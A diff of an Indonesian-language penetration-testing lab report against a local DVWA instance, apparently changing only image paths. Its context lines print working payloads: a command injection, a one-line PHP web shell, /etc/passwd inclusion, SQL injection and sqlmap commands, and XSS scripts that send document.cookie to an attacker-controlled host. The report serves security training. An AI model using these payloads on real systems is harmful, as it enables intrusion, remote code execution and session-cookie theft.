@@ -50,7 +50,7 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
    ```bash
    nmap -sCV -T5 localhost -p 8081 -oN nmap
    ```
-   ![alt text](images/01_dvwa/image.png)
+   ![alt text](images/README/image.png)
 6. jangan lupa ubah Security Level menjadi Low
 
 #### 1. Brute Force
@@ -61,16 +61,16 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
 - Payload 1: isikan username (admin), Payload 2: list password.
 - Gunakan fitur Grep - Match, tambahkan teks yang muncul saat login berhasil (misal: Welcome to the password protected area).
 - Jalankan Start Attack (Simple).
-![alt text](images/01_dvwa/image-1.png)
+![alt text](images/README/image-1.png)
 
 #### 2. Command Injection
 - saya mencoba melkukan ping ke alamat ip 8.8.8.8
-  ![alt text](images/01_dvwa/image-2.png)
+  ![alt text](images/README/image-2.png)
 - lalu saya coba lakukan command injection
   ```bash
   8.8.8.8> /dev/null 2>&1; ls
   ```
-  ![alt text](images/01_dvwa/image-3.png)
+  ![alt text](images/README/image-3.png)
 
 ### 3. Cross Site Request Forgery (CSRF)
 - source code:
@@ -120,10 +120,10 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
   ```bash
   python3 -m http.server
   ```
-  ![alt text](images/01_dvwa/image-10.png)
+  ![alt text](images/README/image-10.png)
 - Jika ada client yang sudah login ke web DVWA, lalu membuka website yang disajikan melalui HTTP server ini, maka client tersebut bisa terkena serangan CSRF. Hal ini terjadi karena browser secara otomatis mengirimkan cookie yang masih aktif ke DVWA saat permintaan (request) dikirim oleh website dari HTTP server tersebut.
 - Dengan cara ini, kamu berhasil mengubah password admin melalui serangan CSRF.
-  ![alt text](images/01_dvwa/image-11.png)
+  ![alt text](images/README/image-11.png)
 
 - Ringkasan CSRF (Cross-Site Request Forgery): \
   Terjadi ketika:
@@ -133,10 +133,10 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
 
 ### 4. File Inclusion
 - buka webnya dan coba buka page File 1
-  ![alt text](images/01_dvwa/image-8.png)
+  ![alt text](images/README/image-8.png)
 - terdapat paramter page, lalu kita coba beberapa path untuk LFI seperti /etc/passwd
   ```http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd```
-  ![alt text](images/01_dvwa/image-12.png)
+  ![alt text](images/README/image-12.png)
 
 ### 5. File Upload
 - buka webnya dan coba buka page File Upload
@@ -145,53 +145,53 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
   <?=`$_GET[p]`?>
   ``` 
 - lalu buka urlnya, dan ingat sesuaikan p itu sesuai dengan yang kita paramter kita inginkan, lalu upload filenya
-  ![alt text](images/01_dvwa/image-9.png)
+  ![alt text](images/README/image-9.png)
 - setelah di upload buka path ini dan buka filenya, 
   ````http://127.0.0.1:8081/hackable/uploads/```
-  ![alt text](images/01_dvwa/image-13.png)
+  ![alt text](images/README/image-13.png)
 - lalu buka file php yang telah di upload, dan tambahkan parameter ?p=[command]
-  ![alt text](images/01_dvwa/image-14.png)
+  ![alt text](images/README/image-14.png)
 - kita telah berhasil mendapatkan RCE
 
 ### 6. SQL Injection
 - test parameter 1
-  ![alt text](images/01_dvwa/image-4.png)
+  ![alt text](images/README/image-4.png)
 - test payload sql injection
   ```' OR 1 = 1 #```
-  ![alt text](images/01_dvwa/image-5.png)
+  ![alt text](images/README/image-5.png)
 - kita bisa mendapatkan semua data user
 - kita coba mencari passowrdnya dengan payload
   ```' UNION SELECT user, password FROM users #```
-  ![alt text](images/01_dvwa/image-6.png)
+  ![alt text](images/README/image-6.png)
 - lalu decode menggunakan crackstation / cyberchef
-  ![alt text](images/01_dvwa/image-7.png)
+  ![alt text](images/README/image-7.png)
 
 ### 7. SQL Injection (Blind)
 - buka web sql injection blind, dan coba lakukan dengan sqlmap
   ```sqlmap -u "http://<IP_Server>/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=hash; security=low" --dbs```
-  ![alt text](images/01_dvwa/image-15.png)
-  ![alt text](images/01_dvwa/image-16.png)
+  ![alt text](images/README/image-15.png)
+  ![alt text](images/README/image-16.png)
 
 ### 8. DOM Based Cross Site Scripting (XSS)
 - buka ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>```
-  ![alt text](images/01_dvwa/image-17.png)
+  ![alt text](images/README/image-17.png)
 - Membuat halaman untuk menampung cookie
   ```python3 -m http.server 80```
 - Melakukan pencurian cookie dan kirim ke halaman penampung
   ```http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>```
-  ![alt text](images/01_dvwa/image-18.png)
+  ![alt text](images/README/image-18.png)
 
 ### 9. Reflected Cross Site Scripting (XSS)
 - Reflected cross-site scripting (XSS) muncul saat aplikasi menerima data dalam permintaan HTTP dan menyertakan data tersebut dalam respons langsung dengan cara yang tidak aman.
 - menampilkan alert
   ```<script>alert("test")</script>```
-  ![alt text](images/01_dvwa/image-19.png)
+  ![alt text](images/README/image-19.png)
 - Menampilkan cookie halaman
   ```<input onfocus=javascript:alert(document.cookie) autofocus>```
-  ![alt text](images/01_dvwa/image-20.png)
+  ![alt text](images/README/image-20.png)
 - Melakukan pencurian cookie
   ```<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>```
-  ![alt text](images/01_dvwa/image-21.png)
+  ![alt text](images/README/image-21.png)
 - bisa juga test deface pake script sederhana
   ```js
   <script>
@@ -204,32 +204,32 @@ Metode pengujian mengacu pada standar **NIST SP 800-115**:
     document.body.appendChild(defaceDiv);
   </script>
   ```
-  ![alt text](images/01_dvwa/image-23.png)
+  ![alt text](images/README/image-23.png)
 
 ### 10. Stored Cross Site Scripting (XSS)
 - XSS Stored atau Persistent XSS muncul saat aplikasi menerima data dari sumber yang tidak tepercaya dan menyertakan data tersebut dalam respons HTTP selanjutnya dengan cara yang tidak aman.
 - Sebelum melakukan uji serangan, ubah maxlength pada textarea dari 50 menjadi 500 karakter melalui inspect element
-  ![alt text](images/01_dvwa/image-22.png)
+  ![alt text](images/README/image-22.png)
 - Masukkan script ini ke field Message
   ```<script>window.location='http://<IP_Server>/?cookie='+document.cookie</script>```
 - tiap ada orang yang buka url web yang terkana xss stored maka dia cookienya akan dikirimkan ke ip attacker
-  ![alt text](images/01_dvwa/image-24.png)
+  ![alt text](images/README/image-24.png)
 
 ---
 
 ## 6. Temuan dan Analisis
 | No | Jenis Kerentanan     | Deskripsi Temuan                                       | Dampak                                | Bukti  |
 | -- | -------------------- | ------------------------------------------------------ | ------------------------------------- | ------ |
-| 1  | Brute Force          | Tidak ada limitasi percobaan login                     | Akses akun pengguna tanpa izin        | ![alt text](images/01_dvwa/image-1.png) |
-| 2  | Command Injection    | Input shell tidak disanitasi                           | Eksekusi perintah di server           | ![alt text](images/01_dvwa/image-3.png) |
-| 3  | CSRF                 | Tidak ada proteksi token CSRF                          | Pengubahan data tanpa izin            | ![alt text](images/01_dvwa/image-11.png) |
-| 4  | File Inclusion (LFI) | Parameter `page` bisa diisi path file sistem           | Akses file sensitif di server         | ![alt text](images/01_dvwa/image-12.png) |
-| 5  | File Upload          | Tidak ada filter ekstensi file yang di-upload          | Eksekusi kode jarak jauh (RCE)        | ![alt text](images/01_dvwa/image-14.png) |
-| 6  | SQL Injection        | Parameter `id` tidak divalidasi                        | Akses database tanpa otorisasi        | ![alt text](images/01_dvwa/image-6.png) |
-| 7  | Blind SQL Injection  | Parameter rentan terhadap SQLi tanpa feedback langsung | Akses database secara tersembunyi     | ![alt text](images/01_dvwa/image-16.png) |
-| 8  | DOM-Based XSS        | Script dapat dijalankan dari URL                       | Pencurian cookie atau deface          | ![alt text](images/01_dvwa/image-18.png) |
-| 9  | Reflected XSS        | Input langsung dirender tanpa sanitasi                 | Eksekusi JavaScript di browser user   | ![alt text](images/01_dvwa/image-19.png) |
-| 10 | Stored XSS           | Data disimpan dan dirender tanpa sanitasi              | Eksekusi kode permanen di banyak user | ![alt text](images/01_dvwa/image-24.png) |
+| 1  | Brute Force          | Tidak ada limitasi percobaan login                     | Akses akun pengguna tanpa izin        | ![alt text](images/README/image-1.png) |
+| 2  | Command Injection    | Input shell tidak disanitasi                           | Eksekusi perintah di server           | ![alt text](images/README/image-3.png) |
+| 3  | CSRF                 | Tidak ada proteksi token CSRF                          | Pengubahan data tanpa izin            | ![alt text](images/README/image-11.png) |
+| 4  | File Inclusion (LFI) | Parameter `page` bisa diisi path file sistem           | Akses file sensitif di server         | ![alt text](images/README/image-12.png) |
+| 5  | File Upload          | Tidak ada filter ekstensi file yang di-upload          | Eksekusi kode jarak jauh (RCE)        | ![alt text](images/README/image-14.png) |
+| 6  | SQL Injection        | Parameter `id` tidak divalidasi                        | Akses database tanpa otorisasi        | ![alt text](images/README/image-6.png) |
+| 7  | Blind SQL Injection  | Parameter rentan terhadap SQLi tanpa feedback langsung | Akses database secara tersembunyi     | ![alt text](images/README/image-16.png) |
+| 8  | DOM-Based XSS        | Script dapat dijalankan dari URL                       | Pencurian cookie atau deface          | ![alt text](images/README/image-18.png) |
+| 9  | Reflected XSS        | Input langsung dirender tanpa sanitasi                 | Eksekusi JavaScript di browser user   | ![alt text](images/README/image-19.png) |
+| 10 | Stored XSS           | Data disimpan dan dirender tanpa sanitasi              | Eksekusi kode permanen di banyak user | ![alt text](images/README/image-24.png) |
 
 ---
 
